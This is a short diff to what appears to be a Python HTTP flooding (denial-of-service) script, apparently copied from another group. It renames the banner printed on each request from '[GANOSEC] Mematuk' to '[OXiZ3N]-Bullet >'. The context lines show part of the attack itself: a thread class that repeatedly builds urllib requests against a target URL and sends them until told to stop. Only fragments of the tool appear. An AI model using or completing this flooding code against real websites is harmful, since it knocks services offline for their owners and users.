@@ -41,7 +41,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("[GANOSEC] Mematuk [%s]\r"%(self.url))
+        print("[OXiZ3N]-Bullet > [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -51,7 +51,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("[GANOSEC] Mematuk [%s]\r"%(self.url))
+                sys.stdout.write("[OXiZ3N]-Bullet > [%s]\r"%(self.url))
                 sys.exit(0)
         sys.exit(0)
 
